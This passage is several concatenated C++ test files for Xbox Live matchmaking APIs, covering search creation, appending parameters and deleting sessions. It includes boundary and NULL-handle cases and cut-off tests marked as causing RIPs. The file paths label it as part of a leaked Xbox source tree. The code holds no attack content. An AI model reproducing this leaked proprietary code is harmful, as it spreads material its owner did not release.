	hr = XOnlineMatchSearchCreate(STRINGPARAM_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendString(hSearch, STRING1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendString returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendString failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendString returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Append string when there isn't enough space available");
	// -----------------------------------------------------------------
	
	hr = XOnlineMatchSearchCreate(STRINGPARAM_INDEX, 10, 1, GetBufferLenForString(STRING1) - 1, sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendString(hSearch, STRING1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendString returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendString failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendString returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hSearch);



	// -----------------------------------------------------------------
	START_TESTCASE("Append an string attribute when there is exactly enough space");
	// -----------------------------------------------------------------

	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(STRINGPARAM_INDEX, 10, 1, GetBufferLenForString(STRING1), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned success!");
	
	hr = XOnlineMatchSearchAppendString(hSearch, STRING1);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Couldn't add string to search request!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);
	


	// -----------------------------------------------------------------
	START_TESTCASE("Append an empty string parameter");
	// -----------------------------------------------------------------

	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(STRINGPARAM_INDEX, 10, 1, GetBufferLenForString(L""), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendString(hSearch, L"");
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Couldn't add empty string to search request!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);



/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Try to append string to a search that has already been sent");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(STRINGPARAM_INDEX, 10, 1, GetBufferLenForString(STRING1), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendString(hSearch, STRING1);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendString failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendString returned success but should have failed!");
	}
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/	

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Append blob parameter with NULL task handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchAppendBlob(NULL, strlen(BLOB1), BLOB1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchAppendBlob returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendBlob failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendBlob returned success but should have failed!");
	}

	END_TESTCASE();
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Append blob when no parameter slots are available");
	// -----------------------------------------------------------------
	
	hr = XOnlineMatchSearchCreate(BLOBPARAM_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendBlob(hSearch, strlen(BLOB1), BLOB1);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendBlob failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendBlob returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Append blob when there isn't enough space available");
	// -----------------------------------------------------------------
	
	hr = XOnlineMatchSearchCreate(BLOBPARAM_INDEX, 10, 1, GetBufferLenForBlob(BLOB1) - 1, sizeof(XMATCH_SEARCHRESULT) + 500, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendBlob(hSearch, strlen(BLOB1), BLOB1);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendBlob failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendBlob returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hSearch);



	// -----------------------------------------------------------------
	START_TESTCASE("Append a blob attribute when there is exactly enough space");
	// -----------------------------------------------------------------

	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(BLOBPARAM_INDEX, 10, 1, GetBufferLenForBlob(BLOB1), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	
	hr = XOnlineMatchSearchAppendBlob(hSearch, strlen(BLOB1), BLOB1);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Couldn't add string to search request!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search completed successfully");
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
	


	// -----------------------------------------------------------------
	START_TESTCASE("Append an empty blob");
	// -----------------------------------------------------------------

	AttributeTest[0].dwAttributeID = GLOBALINT_ID1;
	AttributeTest[0].Value.qwValue = INT1;
	AttributeTest[0].qwUserID = 0;
	AttributeTest[1].dwAttributeID = GLOBALSTR_ID1;
	AttributeTest[1].Value.pvValue = (VOID *) STRING1;
	AttributeTest[1].qwUserID = 0;
	AttributeTest[2].dwAttributeID = GLOBALBLB_ID1;
	AttributeTest[2].Value.pvValue = (VOID *) BLOB1;
	AttributeTest[2].qwUserID = 0;

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, AttributeTest, 3, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to search for");
	}

	hr = XOnlineMatchSearchCreate(BLOBPARAM_INDEX, 10, 1, GetBufferLenForBlob(""), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	hr = XOnlineMatchSearchAppendBlob(hSearch, 0, "");
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Couldn't add string to search request!");
	}

	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	hSearch = NULL;
	PASS_TESTCASE("Search completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Try to append blob to a search that has already been sent");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(BLOBPARAM_INDEX, 10, 1, GetBufferLenForBlob(BLOB1), sizeof(XMATCH_SEARCHRESULT) + 200, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned success!");
	
	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if (FAILED(hr))
	{
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = XOnlineMatchSearchAppendBlob(hSearch, strlen(BLOB1), BLOB1);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchAppendBlob failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSearchAppendBlob returned success but should have failed!");
	}
	
	END_TESTCASE();
	CLEANUP_TASK(hSearch);
*/
Exit:
	if(hEvent)
		CloseHandle(hEvent);

	if(!fCompleted && hSearch)
		XOnlineTaskClose(hSearch);

	return hr;
} // XMatchTest_AppendParams


} // namespace XMatchTestNamespace
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\core\deletesession.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xmatchtest.h"

using namespace XMatchTestNamespace;

namespace XMatchTestNamespace {

//==================================================================================
// Prototypes
//==================================================================================
HRESULT XMatchTest_DeleteSession(HANDLE hLog);

//==================================================================================
// XMatchTest_DeleteSession
//----------------------------------------------------------------------------------
//
// Description: Contains test cases for deleting sessions
//
// Arguments:
//	HANDLE hLog		Handle to logging subsystem
//
// Returns: S_OK if the act of running the test was successful (not whether the
//			test itself was successful), the error code otherwise.
//==================================================================================
HRESULT XMatchTest_DeleteSession(HANDLE hLog, XONLINETASK_HANDLE hLogon)
{
	XONLINETASK_HANDLE hDelete = NULL;
	XNKID SessionID;
	HRESULT hr = E_FAIL;
    HANDLE hEvent = NULL;
    DWORD dwPollCounter = 0;
	BOOL fCompleted = FALSE, fDone = FALSE;

	memset(&SessionID, 0, sizeof(SessionID));

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
		goto Exit;

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Delete session with NULL task handle");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to delete");
	}

	hr = XOnlineMatchSessionDelete(SessionID, hEvent, NULL);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionDelete failed as expected");
	}
	else
	{
		XOnlineTaskClose(hDelete);
		hDelete = NULL;
		FAIL_TESTCASE("XOnlineMatchSessionDelete returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hDelete);
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Delete session with session ID of 0");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionDelete(SessionID, hEvent, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionDelete failed as expected");
	}
	else
	{
		XOnlineTaskClose(hDelete);
		hDelete = NULL;
		FAIL_TESTCASE("XOnlineMatchSessionDelete returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hDelete);
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Delete session with a NULL work handle");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to delete");
	}

	hr = XOnlineMatchSessionDelete(SessionID, NULL, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
	}
	
	hr = PollTaskUntilComplete(hDelete, NULL, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session delete failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session delete didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Delete completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hDelete);



	// -----------------------------------------------------------------
	START_TESTCASE("Delete session with a valid work handle");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to delete");
	}

	hr = XOnlineMatchSessionDelete(SessionID, hEvent, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
	}
	
	hr = PollTaskUntilComplete(hDelete, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session delete failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session delete didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Delete completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hDelete);


	// -----------------------------------------------------------------
	START_TESTCASE("Try to delete a session that doesn't exist");
	// -----------------------------------------------------------------

	*((ULONGLONG *) &SessionID) = 0x8000000000000000;

	hr = XOnlineMatchSessionDelete(SessionID, hEvent, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
	}
	
	hr = PollTaskUntilComplete(hDelete, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete  returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Delete returned success but should have failed");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session delete didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Delete completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hDelete);


	// -----------------------------------------------------------------
	START_TESTCASE("Delete session that doesn't have any pub/priv available");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(0, 0, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to delete");
	}

	hr = XOnlineMatchSessionDelete(SessionID, hEvent, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
	}
	
	hr = PollTaskUntilComplete(hDelete, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session delete failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session delete didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Delete completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hDelete);



	// -----------------------------------------------------------------
	START_TESTCASE("Open and close a delete task without calling work pump");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSessionDelete(SessionID, hEvent, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
	}

	XOnlineTaskClose(hDelete);
	hDelete = NULL;

	PASS_TESTCASE("XOnlineTaskClose completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hDelete);	



	// -----------------------------------------------------------------
	START_TESTCASE("Cancel a delete task that has already completed and then close it");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	if(!CreateSession(10, 10, NULL, 0, &SessionID))
	{
		FAIL_TESTCASE("Couldn't create session to delete");
	}

	hr = XOnlineMatchSessionDelete(SessionID, hEvent, &hDelete);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hDelete, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session delete failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session delete didn't complete within 30 seconds");
	}
	
	XOnlineTaskClose(hDelete);
	hDelete = NULL;
	
	PASS_TESTCASE("XOnlineTaskClose completed successfully");
	
	END_TESTCASE();
	CLEANUP_TASK(hDelete);

Exit:
	if(hEvent)
		CloseHandle(hEvent);

	if(!fCompleted && hDelete)
		XOnlineTaskClose(hDelete);

	return hr;
} // XMatchTest_DeleteSession


} // namespace XMatchTestNamespace
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\core\createsearch.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xmatchtest.h"

using namespace XMatchTestNamespace;

namespace XMatchTestNamespace {

//==================================================================================
// Prototypes
//==================================================================================
HRESULT XMatchTest_CreateSearch(HANDLE hLog);

//==================================================================================
// XMatchTest_CreateSearch
//----------------------------------------------------------------------------------
//
// Description: Contains test cases for creating searches via Xbox Matchmaking APIs
//
// Arguments:
//	HANDLE hLog		Handle to logging subsystem
//
// Returns: S_OK if the act of running the test was successful (not whether the
//			test itself was successful), the error code otherwise.
//==================================================================================
HRESULT XMatchTest_CreateSearch(HANDLE hLog, XONLINETASK_HANDLE hLogon)
{
	PXMATCH_SEARCHRESULT *ppSearchResults = NULL;
	XONLINETASK_HANDLE hSearch = NULL;
	XNADDR LocalXnAddr;
// TEMP Need to add test cases for key exchange key comparisons
//	XNKEY LocalXnKey;
	XNKID SessionID;
	BYTE BigBlob[800], bAttributeBuffer[100];
	ATTRIBUTE AttributeTest[4];
	PARAMETER ParameterTest[4];
	HRESULT hr = E_FAIL;
    HANDLE hEvent = NULL;
    DWORD dwPollCounter = 0, dwResultCounter = 0, dwAddrStatus = 0, dwNumResults = 0, dwAttributeType = 0;
	DWORD dwAttributeLen = 0;
	BOOL fCompleted = FALSE, fRet = FALSE, fDone = FALSE;

	memset(BigBlob, 'a', 799);
	BigBlob[799] = 0;

	memset(&SessionID, 0, sizeof(XNKID));
// TEMP Need to add test cases for key exchange key comparisons
//	memset(&LocalXnKey, 0, sizeof(XNKEY));

	dwAddrStatus = XNetGetTitleXnAddr(&LocalXnAddr);
	if(dwAddrStatus == XNET_GET_XNADDR_PENDING)
		xLog(hLog, XLL_FAIL, "Local address still pending, some tests will fail.");
	else if(dwAddrStatus & XNET_GET_XNADDR_NONE)
		xLog(hLog, XLL_FAIL, "Local address not available, some tests will fail.");

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
		goto Exit;


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Create a search with a NULL task pointer");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(INVALIDSP_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, NULL);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchCreate failed as expected");
	}
	else
	{
		XOnlineTaskClose(hSearch);
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchCreate returned success but should have failed!");
	}

	END_TESTCASE();
*/

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Create search with non-zero parameters but zero parameters length");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(INVALIDSP_INDEX, 10, 1, 0, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchCreate failed as expected");
	}
	else
	{
		XOnlineTaskClose(hSearch);
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchCreate returned success but should have failed!");
	}

	END_TESTCASE();
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Create search with zero parameters but non-zero parameters length");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(INVALIDSP_INDEX, 10, 0, 100, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchCreate failed as expected");
	}
	else
	{
		XOnlineTaskClose(hSearch);
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchCreate returned success but should have failed!");
	}

	END_TESTCASE();
*/

	// -----------------------------------------------------------------
	START_TESTCASE("Create search with zero results allowed");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(NOPARAM_INDEX, 0, 1, 100, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSearchCreate failed as expected");
	}
	else
	{
		XOnlineTaskClose(hSearch);
		hSearch = NULL;
		FAIL_TESTCASE("XOnlineMatchSearchCreate returned success but should have failed!");
	}

	END_TESTCASE();


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search with a NULL work handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(NOPARAM_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 100, NULL, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, NULL, 30000, &dwPollCounter, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("Session search failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search completed successfully");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search with an invalid stored procedure ID and no parameters");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSearchCreate(INVALIDSP_INDEX, 10, 0, 0, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
	}
	
	hr = XOnlineMatchSearchSend(hSearch);

	xLog(hLog, XLL_INFO, "XOnlineMatchSearchSend returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSearchSend failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hSearch, hEvent, 30000, &dwPollCounter, &fCompleted, FALSE);

	xLog(hLog, XLL_INFO, "PollTaskUntilComplete returned 0x%08x", hr);
	if(!FAILED(hr))
	{
		FAIL_TESTCASE("Search succeeded but should have failed!");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("Session search didn't complete within 30 seconds");
	}

	PASS_TESTCASE("Search failed as expected");

	END_TESTCASE();
	CLEANUP_TASK(hSearch);


	// -----------------------------------------------------------------
	START_TESTCASE("Create a search with an invalid stored procedure ID and each kind of parameter");
	// -----------------------------------------------------------------
	
	hr = XOnlineMatchSearchCreate(INVALIDSP_INDEX, 10, 3, 1000, sizeof(XMATCH_SEARCHRESULT) + 100, hEvent, &hSearch);

